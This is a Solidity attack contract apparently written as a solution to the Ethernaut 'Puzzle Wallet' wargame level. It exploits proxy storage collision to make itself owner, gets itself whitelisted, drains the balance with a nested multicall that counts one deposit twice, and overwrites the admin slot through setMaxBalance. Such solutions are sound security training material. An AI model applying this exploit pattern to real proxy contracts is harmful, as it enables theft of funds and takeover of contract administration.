// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuzzleWallet.sol";

contract ProxyBypass {

    PuzzleProxy instance;
    PuzzleWallet instanceWallet;
    PuzzleWallet logicImpl;
    address public hacker;

    constructor(address payable $your_ethernaut_proxy_here, address $your_logic_impl_here) payable {
        instance = PuzzleProxy($your_ethernaut_proxy_here);
        instanceWallet = PuzzleWallet($your_ethernaut_proxy_here);
        logicImpl = PuzzleWallet($your_logic_impl_here);
        hacker = msg.sender;
    }

    function sharingStorageIsntCaring() public {
        // become owner aka pendingAdmin lol
        instance.proposeNewAdmin(address(this));
        // become whitelisted via pwnership
        instanceWallet.addToWhitelist(address(this));

        // drain victim proxy contract balance to 0
        bytes[] memory data = new bytes[](3);
        bytes[] memory nestedData = new bytes[](1);
        data[0] = bytes(abi.encodeWithSignature("deposit()"));
        nestedData[0] = data[0];
        data[1] = bytes(abi.encodeWithSignature("multicall(bytes[])", nestedData));
        data[2] = bytes(abi.encodeWithSignature("execute(address,uint256,bytes)", address(0x0000000000000000000000000000000000000000), 0.002 ether, 'KweenBirb just pwnd u LOL'));
        instanceWallet.multicall{ value: 0.001 ether }(data);

        // become admin by setting maxBalance (aka admin) to KweenBirbhaxxz0r LOL
        instanceWallet.setMaxBalance(uint256(uint160(hacker)));
    }

    function checkAdmin() public view returns (address) {
        return instance.admin();
    }
}
